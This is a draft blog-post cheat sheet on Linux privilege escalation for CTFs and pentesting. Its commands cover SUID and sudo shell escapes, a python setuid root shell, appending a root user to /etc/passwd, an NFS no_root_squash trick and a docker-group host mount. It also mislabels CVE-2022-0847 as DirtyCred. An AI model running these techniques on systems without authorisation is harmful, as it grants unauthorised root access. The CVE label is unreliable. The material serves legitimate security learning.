---
title: Linux Privilege Escalation
published: 2026-01-18
description: 'A comprehensive guide to Linux privilege escalation techniques commonly used in CTFs and penetration testing'
image: ''
tags: [Linux, PrivEsc, CTF, Pentesting]
category: Notes
draft: true
---

# Linux Privilege Escalation Cheatsheet

Privilege escalation is a critical phase in penetration testing and CTF challenges. This note covers common techniques and tools for escalating privileges on Linux systems.

## Initial Enumeration

### System Information
```bash
# OS and kernel version
uname -a
cat /etc/issue
cat /etc/*-release

# Architecture
uname -m
lscpu

# Environment variables
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bashrc
```

### User Enumeration
```bash
# Current user
whoami
id

# All users
cat /etc/passwd
cat /etc/group

# Sudo permissions
sudo -l

# Users with console
grep -vE "nologin|false" /etc/passwd
```

### Network Information
```bash
# Network interfaces
ifconfig
ip a

# Active connections
netstat -antup
ss -tunap

# Firewall rules
iptables -L
```

## SUID/SGID Binaries

SUID binaries run with the permissions of the file owner, making them prime targets for privilege escalation.

### Finding SUID/SGID Files
```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Both SUID and SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) 2>/dev/null
```

### Common Exploitable SUID Binaries
Check [GTFOBins](https://gtfobins.github.io/) for exploitation methods:
- `find`, `vim`, `nano`, `cp`, `mv`
- `nmap` (older versions)
- `bash`, `sh`, `dash`
- `python`, `perl`, `ruby`

### Example: Exploiting SUID `find`
```bash
find . -exec /bin/sh -p \; -quit
```

## Sudo Exploitation

### Common Sudo Misconfigurations
```bash
# Run commands as root without password
sudo -l

# Example: sudo vim
sudo vim -c ':!/bin/sh'

# Example: sudo env
sudo env /bin/sh
```

### Sudo Version Exploits
```bash
# Check sudo version
sudo -V

# CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2
# CVE-2019-18634 - sudo < 1.8.26
```

## Capabilities

Linux capabilities allow fine-grained privilege control.

```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# CAP_SETUID - allows setting UID
# CAP_DAC_READ_SEARCH - bypass file read permission checks
```

### Example: CAP_SETUID on Python
```bash
# If python has cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Cron Jobs

### Enumeration
```bash
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron.*

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/

# Check running processes
ps aux
```

### Exploitation
Look for:
- Writable scripts executed by cron
- PATH vulnerabilities in cron jobs
- Wildcard injection in cron scripts

## Writable /etc/passwd

If `/etc/passwd` is writable, you can add a root user:

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add new root user
echo 'newroot:$1$xyz$qJz9xFxM2VhQXJvI5vZJ9/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su newroot
```

## Kernel Exploits

### Check Kernel Version
```bash
uname -r
uname -a
```

### Common Kernel Exploits
- **Dirty COW** (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9
- **DirtyCred** (CVE-2022-0847) - Linux Kernel 5.8 < 5.16.11
- **Netfilter** (CVE-2021-22555) - Linux Kernel < 5.11.15

Use tools like `linux-exploit-suggester` or `linpeas` to identify potential exploits.

## NFS No Root Squash

If NFS is configured with `no_root_squash`:

```bash
# On attacker machine
showmount -e target_ip
mkdir /tmp/mount
mount -o rw target_ip:/share /tmp/mount

# Create SUID binary
cp /bin/bash /tmp/mount/
chmod +s /tmp/mount/bash

# On target
/share/bash -p
```

## Docker Escape

If user is in the `docker` group:

```bash
# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or simpler
docker run -v /:/hostfs --rm -it ubuntu /bin/bash
```

## Automated Tools

- **LinPEAS** - Comprehensive enumeration
- **LinEnum** - Quick enumeration script
- **pspy** - Monitor processes without root
- **linux-exploit-suggester** - Kernel exploit finder

```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

## Important Directories to Check

```bash
/tmp
/var/tmp
/dev/shm
/home/*/.ssh
/root/.ssh
/var/backups
/var/log
/opt
```

## Quick Wins Checklist

- [ ] Check `sudo -l`
- [ ] Search for SUID/SGID binaries
- [ ] Check writable `/etc/passwd` or `/etc/shadow`
- [ ] Enumerate cron jobs
- [ ] Check for capabilities
- [ ] Review running processes
- [ ] Check for Docker/LXC group membership
- [ ] Search for SSH keys
- [ ] Check kernel version for known exploits
- [ ] Look for plaintext passwords in config files

Remember: Always have proper authorization before attempting privilege escalation on any system!
